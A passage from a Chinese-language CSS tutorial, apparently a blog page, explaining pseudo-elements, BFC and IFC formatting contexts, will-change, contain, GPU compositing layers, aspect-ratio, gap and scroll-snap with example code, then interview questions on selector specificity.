align="left">反向选择器</td><td align="left">div:not(.hidden) { display: block }</td></tr></tbody></table><h3 id="伪元素详解（虚拟内容生成）"><a href="#伪元素详解（虚拟内容生成）" class="headerlink" title="伪元素详解（虚拟内容生成）"></a>伪元素详解（虚拟内容生成）</h3><p><strong>核心伪元素</strong></p><table><thead><tr><th align="left">伪元素</th><th align="left">作用</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">::before</td><td align="left">在元素内容前插入</td><td align="left">.alert::before { content: “!” }</td></tr><tr><td align="left">::after</td><td align="left">在元素内容后插入</td><td align="left">清除浮动&#x2F;工具提示</td></tr><tr><td align="left">::first-line</td><td align="left">选中首行文本</td><td align="left">p::first-line { font-size: 1.2em }</td></tr><tr><td align="left">::selection</td><td align="left">用户选中的文本</td><td align="left">::selection { background: gold }</td></tr></tbody></table><p><strong>关键技术要点</strong></p><ol><li>content 属性必须设置（空字符串也要设置）</li><li>伪元素不接受 DOM 事件</li><li>默认位于主元素下层，可通过 <code>z-index</code> 调整</li></ol><h3 id="组合使用技巧示例：纯-CSS-实现工具提示"><a href="#组合使用技巧示例：纯-CSS-实现工具提示" class="headerlink" title="组合使用技巧示例：纯 CSS 实现工具提示"></a>组合使用技巧示例：纯 CSS 实现工具提示</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-attr">[data-tooltip]</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>&#125;<br><span class="hljs-selector-attr">[data-tooltip]</span><span class="hljs-selector-pseudo">:hover</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-built_in">attr</span>(data-tooltip);<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#333</span>;<br>  <span class="hljs-attribute">color</span>: white;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">8px</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<br>  <span class="hljs-attribute">white-space</span>: nowrap;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-3-BFC（块级格式化上下文）与-IFC（行内格式化上下文）"><a href="#4-3-BFC（块级格式化上下文）与-IFC（行内格式化上下文）" class="headerlink" title="4.3 BFC（块级格式化上下文）与 IFC（行内格式化上下文）"></a>4.3 BFC（块级格式化上下文）与 IFC（行内格式化上下文）</h2><h3 id="核心概念对比-1"><a href="#核心概念对比-1" class="headerlink" title="核心概念对比"></a>核心概念对比</h3><table><thead><tr><th align="left">特性</th><th align="left">BFC（Block Formatting Context）</th><th align="left">IFC（Inline Formatting Context）</th></tr></thead><tbody><tr><td align="left">布局方向</td><td align="left">垂直排列</td><td align="left">水平排列</td></tr><tr><td align="left">元素类型</td><td align="left">块级元素参与</td><td align="left">行内级元素参与</td></tr><tr><td align="left">宽度计算</td><td align="left">撑满父容器（除非指定宽度）</td><td align="left">由内容决定</td></tr><tr><td align="left">边距处理</td><td align="left">垂直边距可能合并</td><td align="left">水平边距有效，垂直边距不影响行高</td></tr><tr><td align="left">经典应用</td><td align="left">清除浮动&#x2F;防止边距合并</td><td align="left">文字对齐&#x2F;行内元素排列</td></tr></tbody></table><h3 id="BFC-详解（块级格式化上下文）"><a href="#BFC-详解（块级格式化上下文）" class="headerlink" title="BFC 详解（块级格式化上下文）"></a>BFC 详解（块级格式化上下文）</h3><p><strong>触发条件</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 任一条件即可触发 */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* 最纯净的BFC */</span><br>  <span class="hljs-attribute">overflow</span>: hidden;   <span class="hljs-comment">/* 非visible */</span><br>  <span class="hljs-attribute">float</span>: left/right;<br>  <span class="hljs-attribute">position</span>: absolute/fixed;<br>  <span class="hljs-attribute">display</span>: inline-block/table-cell/flex/grid;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>隔离的布局环境：内部元素不会影响外部元素布局，外部浮动不会侵入 BFC 区域</li><li>边距折叠解决：外部元素不再发生边距合并</li><li>包含浮动元素</li></ul><p><strong>示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;bfc-container&quot;&gt; &lt;!-- 触发BFC --&gt;<br>  &lt;div style=&quot;margin: 20px&quot;&gt;&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;!-- 外部元素不再发生边距合并 --&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table; <span class="hljs-comment">/* 创建BFC */</span><br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IFC-详解（行内格式化上下文）"><a href="#IFC-详解（行内格式化上下文）" class="headerlink" title="IFC 详解（行内格式化上下文）"></a>IFC 详解（行内格式化上下文）</h3><p><strong>触发条件</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 默认由行内级元素自动创建 */</span><br><span class="hljs-selector-class">.inline-container</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline/inline-block/inline-flex;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; <span class="hljs-comment">/* 影响line-height计算 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>行框（line box）概念：每行文本生成一个矩形行框，高度由 <code>line-height</code> 决定</li><li>垂直对齐控制：<code>vertical-align: middle</code> 相对行框对齐</li><li>空白符处理：连续多个空白符合并为单个空格，换行符转为空格</li></ul><h3 id="布局场景对比"><a href="#布局场景对比" class="headerlink" title="布局场景对比"></a>布局场景对比</h3><p><strong>浮动元素处理</strong></p><table><thead><tr><th align="left">方案</th><th align="left">BFC</th><th align="left">IFC</th></tr></thead><tbody><tr><td align="left">效果</td><td align="left">包含浮动，阻止文字环绕</td><td align="left">无法包含浮动，允许文字环绕</td></tr><tr><td align="left">代码</td><td align="left">overflow: hidden</td><td align="left">默认行为</td></tr></tbody></table><p><strong>垂直对齐</strong></p><table><thead><tr><th align="left">方案</th><th align="left">BFC</th><th align="left">IFC</th></tr></thead><tbody><tr><td align="left">控制</td><td align="left">通过margin&#x2F;padding调整</td><td align="left">通过 vertical-align 精确控制</td></tr><tr><td align="left">精度</td><td align="left">整块调整</td><td align="left">像素级对齐</td></tr></tbody></table><h3 id="高频面试"><a href="#高频面试" class="headerlink" title="高频面试"></a>高频面试</h3><p><strong>Q：BFC 如何解决边距合并</strong></p><p>创建独立布局环境，阻断与外部元素的边距折叠</p><p><strong>Q：IFC 中 <code>vertical-align</code> 失效的原因？</strong></p><ul><li>检查元素是否真是行内级（display 值）</li><li>确认父元素有有效 <code>line-height</code></li></ul><p><strong>Q：BFC与display: flow-root的区别？</strong></p><p>flow-root是专为BFC设计的新值，无副作用（不触发滚动条&#x2F;裁剪）</p><h2 id="4-4-CSS-性能优化（will-change、contain、GPU-加速）"><a href="#4-4-CSS-性能优化（will-change、contain、GPU-加速）" class="headerlink" title="4.4 CSS 性能优化（will-change、contain、GPU 加速）"></a>4.4 CSS 性能优化（will-change、contain、GPU 加速）</h2><h3 id="will-change：性能优化预告系统"><a href="#will-change：性能优化预告系统" class="headerlink" title="will-change：性能优化预告系统"></a>will-change：性能优化预告系统</h3><ul><li>作用：预先告知浏览器元素可能发生的变化，让浏览器提前优化</li></ul><p><strong>正确使用姿势</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.optimize</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform, opacity; <span class="hljs-comment">/* 明确指定要变化的属性 */</span><br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;<br>&#125;<br><span class="hljs-selector-class">.optimize</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>最佳实践</strong></p><p>（1）适用场景</p><ul><li>复杂动画元素</li><li>即将发生变化的滚动区域</li></ul><p>（2）避坑指南</p><ul><li>不要过度使用（每个页面 &lt;&#x3D; 5 个）</li><li>动画结束后移除（通过 js）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;animationend&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">willChange</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="contain：布局隔离核武器"><a href="#contain：布局隔离核武器" class="headerlink" title="contain：布局隔离核武器"></a>contain：布局隔离核武器</h3><ul><li>作用：限制浏览器重绘&#x2F;回流范围，类似于 React 的 shouldComponentUpdate</li></ul><p><strong>关键属性值</strong></p><table><thead><tr><th align="left">值</th><th align="left">优化方向</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">layout</td><td align="left">隔离布局计算</td><td align="left">频繁移动的独立组件</td></tr><tr><td align="left">paint</td><td align="left">限制绘制区域</td><td align="left">弹窗&#x2F;下拉菜单</td></tr><tr><td align="left">size</td><td align="left">忽略子元素尺寸影响</td><td align="left">固定尺寸容器</td></tr><tr><td align="left">strict</td><td align="left">全部隔离（性能最强）</td><td align="left">复杂动画组件</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.product-card</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict; <span class="hljs-comment">/* 卡片内部变化不影响外部布局 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="GPU加速：复合层优化策略"><a href="#GPU加速：复合层优化策略" class="headerlink" title="GPU加速：复合层优化策略"></a>GPU加速：复合层优化策略</h3><p><strong>GPU 加速的本质</strong></p><p>浏览器将特定元素的渲染工作从 CPU 转移到 GPU 处理，利用图形硬件的并行计算能力。这种优化通过创建独立的复合层实现。</p><p><strong>核心触发条件（chromium 内核为例）</strong></p><p>（1）3D 变换属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-3d</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate3d</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">/* 最常用hack */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">10deg</span>);        <span class="hljs-comment">/* 任意3D函数 */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">perspective</span>(<span class="hljs-number">500px</span>);    <span class="hljs-comment">/* 景深设置 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>作用机制：强制浏览器将元素视为 3D 空间对象，自动触发层提升</p><p>（2）透明度动画 + 硬件加速</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.fade-in</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: opacity;  <span class="hljs-comment">/* 预先声明 */</span><br>  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>特殊场景：仅当与 transform 或 filter 组合时 GPU 加速才稳定生效</p><p>（3）滤镜效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.filter-gpu</span> &#123;<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">5px</span>);          <span class="hljs-comment">/* 高斯模糊 */</span><br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">saturate</span>(<span class="hljs-number">180%</span>); <span class="hljs-comment">/* 背景滤镜 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>性能警告：filter 属性可能引发重绘（需配合 will-change 优化）</p><p>（4）强制层提升属性</p><table><thead><tr><th align="left">属性</th><th align="left">效果</th><th align="left">推荐指数</th></tr></thead><tbody><tr><td align="left">will-change: transform</td><td align="left">最标准做法</td><td align="left">★★★★★</td></tr><tr><td align="left">backface-visibility: hidden</td><td align="left">旧版兼容方案</td><td align="left">★★★☆☆</td></tr><tr><td align="left">perspective: 1000px</td><td align="left">创建3D上下文</td><td align="left">★★★★☆</td></tr></tbody></table><p><strong>优化原理</strong></p><ul><li>将元素提升到独立复合层</li><li>避免与主线程的布局计算相互阻塞</li></ul><p><strong>浏览器渲染管线分析</strong></p><pre class="mermaid">graph TD    A[Style Recalc] --> B[Layout]    B --> C[Paint]    C --> D[Composite]    D -->|GPU加速| E[Layer Drawing]</pre><p>关键阶段：</p><ul><li>Composite：浏览器决定哪些元素需要独立图层</li><li>Layer Drawing：GPU实际渲染图层</li></ul><p><strong>层创建规则</strong></p><p>（1）显式触发条件</p><ul><li>3D 或透视变换（perspective、transform3d）</li><li>视频&#x2F;canvas&#x2F;webGL 等嵌入式内容</li><li>对 opacity&#x2F;transform 等做 CSS 动画</li><li>具有 filter 或 mask 属性的元素</li></ul><p>（2）隐式触发条件</p><ul><li>重叠元素（z-index 较高可能被提升）</li><li>滚动容器内的固定位置元素</li><li>使用 position:fixed 的元素</li></ul><p><strong>注意事项</strong></p><ul><li>内存消耗：每个复合层约占用 1MB 内存</li><li>层爆炸：避免超过 100 个复合层（chromium 限制）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 错误：过度创建复合层 */</span><br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>);<br>&#125;<br><br><span class="hljs-comment">/* 正确：合并优化 */</span><br><span class="hljs-selector-class">.optimized-card</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform, box-shadow;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="组合优化方案"><a href="#组合优化方案" class="headerlink" title="组合优化方案"></a>组合优化方案</h3><p>（1）虚拟列表优化</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.list-item</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict;<br>  <span class="hljs-attribute">will-change</span>: transform;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-built_in">var</span>(--pos));<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）高性能动画三件套</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.smooth-animation</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-attribute">will-change</span>: transform;<br>  <span class="hljs-attribute">contain</span>: strict;<br>  <span class="hljs-comment">/* 只使用opacity/transform变化 */</span><br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）谷歌Chrome团队建议</p><ul><li>对position: fixed元素始终使用will-change: transform</li><li>滚动容器设置overflow: auto而非scroll（避免常驻层）</li></ul><h2 id="4-5-现代-CSS-特性（aspect-ratio、gap、scroll-snap）"><a href="#4-5-现代-CSS-特性（aspect-ratio、gap、scroll-snap）" class="headerlink" title="4.5 现代 CSS 特性（aspect-ratio、gap、scroll-snap）"></a>4.5 现代 CSS 特性（aspect-ratio、gap、scroll-snap）</h2><h3 id="aspect-ratio：实现元素宽高比的终极解决方案"><a href="#aspect-ratio：实现元素宽高比的终极解决方案" class="headerlink" title="aspect-ratio：实现元素宽高比的终极解决方案"></a>aspect-ratio：实现元素宽高比的终极解决方案</h3><p><strong>基础用法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.media-box</span> &#123;<br>  <span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">16</span>/<span class="hljs-number">9</span>; <span class="hljs-comment">/* 宽度:高度=16:9 */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* 宽度优先，高度自动计算 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>计算规则</strong></p><p>高度 &#x3D; 宽度 x （分母&#x2F;分子）</p><p><strong>特殊场景处理</strong></p><table><thead><tr><th align="left">场景</th><th align="left">解决方案</th></tr></thead><tbody><tr><td align="left">同时设置宽高</td><td align="left">aspect-ratio会覆盖height</td></tr><tr><td align="left">最小&#x2F;最大高度限制</td><td align="left">使用min-height&#x2F;max-height</td></tr><tr><td align="left">替换元素(如img)</td><td align="left">优先使用元素原生宽高比</td></tr></tbody></table><h3 id="gap：取代-margin-的智能间距系统"><a href="#gap：取代-margin-的智能间距系统" class="headerlink" title="gap：取代 margin 的智能间距系统"></a>gap：取代 margin 的智能间距系统</h3><p><strong>多布局通用语法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid-layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* 行列间距统一 */</span><br>&#125;<br><br><span class="hljs-selector-class">.flex-layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span>; <span class="hljs-comment">/* 行间距 列间距 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>浏览器兼容策略</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-comment">/* 旧版Grid支持 */</span><br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-comment">/* 标准写法 */</span><br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="scroll-snap：精准控制滚动"><a href="#scroll-snap：精准控制滚动" class="headerlink" title="scroll-snap：精准控制滚动"></a>scroll-snap：精准控制滚动</h3><p><strong>完整属性体系</strong></p><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">scroll-snap-type</td><td align="left">容器滚动捕捉类型</td><td align="left">x mandatory</td></tr><tr><td align="left">scroll-snap-align</td><td align="left">子项对齐位置</td><td align="left">start center end</td></tr><tr><td align="left">scroll-snap-stop</td><td align="left">是否强制停留</td><td align="left">normal always</td></tr><tr><td align="left">scroll-padding</td><td align="left">滚动视窗内边距</td><td align="left">20px</td></tr></tbody></table><p><strong>横向轮播图实现</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;carousel&quot;&gt;<br>  &lt;div class=&quot;slide&quot;&gt;1&lt;/div&gt;<br>  &lt;div class=&quot;slide&quot;&gt;2&lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.carousel</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">overflow-x</span>: auto;<br>  <span class="hljs-attribute">scroll-snap-type</span>: x mandatory;<br>  <span class="hljs-attribute">scroll-padding</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* 避免内容被遮挡 */</span><br>&#125;<br><br><span class="hljs-selector-class">.slide</span> &#123;<br>  <span class="hljs-attribute">scroll-snap-align</span>: start;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">80vw</span>; <span class="hljs-comment">/* 每屏显示一个 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="浏览器支持与降级方案"><a href="#浏览器支持与降级方案" class="headerlink" title="浏览器支持与降级方案"></a>浏览器支持与降级方案</h3><p><strong>特性检测策略</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS">// 检测<span class="hljs-attribute">aspect-ratio</span>支持<br>const supportsAspectRatio = CSS<span class="hljs-selector-class">.supports</span>(&#x27;<span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">1</span>/<span class="hljs-number">1</span><span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 检测gap支持（Flexbox版本）</span><br><span class="hljs-string">const supportsFlexGap = CSS.supports(&#x27;</span>gap: <span class="hljs-number">10px</span><span class="hljs-string">&#x27;, &#x27;</span>display: flex<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><p><strong>渐进增强写法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-comment">/* 旧版Flex布局间距 */</span><br>  <span class="hljs-attribute">margin</span>: -<span class="hljs-number">5px</span>;<br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br><span class="hljs-keyword">@supports</span> (<span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-selector-class">.item</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第五章：CSS-工程化与架构"><a href="#第五章：CSS-工程化与架构" class="headerlink" title="第五章：CSS 工程化与架构"></a>第五章：CSS 工程化与架构</h1><h2 id="5-1-CSS-预处理（Sass-Less-变量、嵌套、Mixin）"><a href="#5-1-CSS-预处理（Sass-Less-变量、嵌套、Mixin）" class="headerlink" title="5.1 CSS 预处理（Sass&#x2F;Less 变量、嵌套、Mixin）"></a>5.1 CSS 预处理（Sass&#x2F;Less 变量、嵌套、Mixin）</h2><h2 id="5-2-CSS-模块化（BEM、CSS-Modules、CSS-in-JS）"><a href="#5-2-CSS-模块化（BEM、CSS-Modules、CSS-in-JS）" class="headerlink" title="5.2 CSS 模块化（BEM、CSS Modules、CSS-in-JS）"></a>5.2 CSS 模块化（BEM、CSS Modules、CSS-in-JS）</h2><h2 id="5-3-PostCSS-与-Autoprefixer"><a href="#5-3-PostCSS-与-Autoprefixer" class="headerlink" title="5.3 PostCSS 与 Autoprefixer"></a>5.3 PostCSS 与 Autoprefixer</h2><h2 id="5-4-原子化-CSS（Tailwind-CSS、UnoCSS）"><a href="#5-4-原子化-CSS（Tailwind-CSS、UnoCSS）" class="headerlink" title="5.4 原子化 CSS（Tailwind CSS、UnoCSS）"></a>5.4 原子化 CSS（Tailwind CSS、UnoCSS）</h2><h2 id="5-5-设计系统与-CSS-架构（主题切换、变量管理）"><a href="#5-5-设计系统与-CSS-架构（主题切换、变量管理）" class="headerlink" title="5.5 设计系统与 CSS 架构（主题切换、变量管理）"></a>5.5 设计系统与 CSS 架构（主题切换、变量管理）</h2><h1 id="第六章：CSS-面试高频考点"><a href="#第六章：CSS-面试高频考点" class="headerlink" title="第六章：CSS 面试高频考点"></a>第六章：CSS 面试高频考点</h1><h2 id="6-1-CSS-优先级与权重深度考察"><a href="#6-1-CSS-优先级与权重深度考察" class="headerlink" title="6.1 CSS 优先级与权重深度考察"></a>6.1 CSS 优先级与权重深度考察</h2><h3 id="基础概念考察"><a href="#基础概念考察" class="headerlink" title="基础概念考察"></a>基础概念考察</h3><p><strong>Q：请解释 CSS 选择器的权重计算规则？</strong></p><p>权重由四个分量组成，按 (a, b, c, d) 计算：</p><ul><li>a：!important（非选择器，单独标记）</li><li>b：ID选择器数量（如 #header）</li><li>c：类&#x2F;伪类&#x2F;属性选择器数量（如 .class, :hover, [type&#x3D;”text”]）</li><li>d：元素&#x2F;伪元素选择器数量（如 div, ::before）</li></ul><p>示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#nav</span> <span class="hljs-selector-class">.item</span><span class="hljs-selector-pseudo">:hover</span><span class="hljs-selector-pseudo">::before</span> &#123;&#125; <span class="hljs-comment">/* 权重：0,1,2,1 */</span><br></code></pre></td></tr></table></figure><p>陷阱：<code>!important</code> 的权重真的最高吗？</p><ul><li>当多个 !important 冲突时，仍需按选择器权重比较</li><li>!important 会破坏样式层叠，应尽量避免</li></ul><h3 